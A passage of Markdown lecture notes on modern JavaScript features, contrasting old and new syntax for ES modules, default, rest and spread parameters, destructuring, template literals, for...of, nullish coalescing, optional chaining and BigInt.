import express from 'express';
```

#### Key characteristics of ES Modules

```javascript
// 1. import is STATIC — must be at TOP of file, not inside functions
function loadIfNeeded() {
    import { tool } from './tool.js';   // ❌ SyntaxError — not allowed here
}

// 2. import is ASYNCHRONOUS — browser can start loading before parsing finishes

// 3. Dynamic import() is possible — returns a Promise
async function loadIfNeeded(condition) {
    if (condition) {
        const tool = await import('./tool.js');   // ✅ dynamic import
        tool.run();
    }
}

// 4. .js extension usually required in import paths
import { add } from './math';     // ⚠️  may fail
import { add } from './math.js';  // ✅  explicit extension
```




---

## Default Parameters — Parameters Not Specified

**Old Way** — Unspecified parameters are set to `undefined`. You need to explicitly set them if you want a different default:

```javascript
function myFunc(a, b) {
    a = a || 1;
    b = b || "Hello";
}
```

**New Way** — Can explicitly define default values if parameter is not defined:

```javascript
function myFunc(a = 1, b = "Hello") {
}
```

---

## Rest Parameters `...`

**Old Way** — Parameters not listed but passed can be accessed using the `arguments` array:

```javascript
function myFunc() {
    var a = arguments[0];
    var b = arguments[1];
    var c = arguments[2];
    // arguments[N]
}
```

**New Way** — Additional parameters can be placed into a named array:

```javascript
function myFunc(a, b, ...theArgsArray) {
    var c = theArgsArray[0];
}
```

---

## Spread Operator `...`

Expand an array to pass its values to a function or insert it into an array.

**Old Way:**

```javascript
var anArray = [1, 2, 3];
myFunc.apply(null, anArray);
var o = [5].concat(anArray).concat([6]);
```

**New Way:**

```javascript
var anArray = [1, 2, 3];
myFunc(...anArray);
var o = [5, ...anArray, 6];
```

> Works on iterable types: strings & arrays

---

## Destructuring Assignment

**Old Way:**

```javascript
// Array destructuring
var a = arr[0];
var b = arr[1];
var c = arr[2];

// Object destructuring
var name   = obj.name;
var age    = obj.age;
var salary = obj.salary;

// Function parameter
function render(props) {
    var name = props.name;
    var age  = props.age;
}
```

**New Way:**

```javascript
// Array destructuring
let [a, b, c] = arr;

// Object destructuring
let { name, age, salary } = obj;

// Function parameter destructuring
function render({ name, age }) {
}
```

---

## Template String Literals

Use string concatenation to build up strings from variables.

**Old Way:**

```javascript
function formatGreetings(name, age) {
    var str =
        "Hi " + name +
        " your age is " + age;
    ...
}
```

**New Way:**

```javascript
function formatGreetings(name, age) {
    let str = `Hi ${name} your age is ${age}`;
}
```

Also allows **multi-line strings**:

```javascript
`This string has
two lines`
```

> Very useful in frontend code. Strings can be delimited by `" "`, `' '`, or `` ` ` ``

---

## For...of

Iterate over an array without using indexes.

**Old Way:**

```javascript
var a   = [5, 6, 7];
var sum = 0;
for (var i = 0; i < a.length; i++) {
    sum += a[i];
}
```

**New Way:**

```javascript
let sum = 0;
for (ent of a) {
    sum += ent;
}
```

> Iterate over arrays, strings, `Map`, `Set`, without using indexes.

---

## ECMAScript 2020

### Nullish Coalescing Operator (`??`)

```javascript
val1 ?? val2;
```

- Returns `val2` if `val1` is `null` or `undefined`, otherwise returns `val1`
- Like `val1 || val2` but safer:

```javascript
param ?? 32;   // works for ALL number values of param, including 0
```

### Optional Chaining (`?.`)

```javascript
obj?.prop             // returns undefined if obj is null/undefined, else obj.prop
obj?.subobj?.prop     // handles obj or subobj being null or undefined
func?.()             // calls func only if not null or undefined
arr?.[1]             // accesses array only if arr is not undefined or null
```

### BigInt

Bigger than 53-bit integers:

```javascript
9007199254740992n    // 'n' suffix makes it a BigInt
```

> Makes working with 64-bit integers from other languages easier.

---

## Some Additional Extensions

### `Set`, `Map`, `WeakSet`, `WeakMap` Objects
- Defined interfaces for common abstractions

### `async`/`await` and Promises
- Asynchronous programming helpers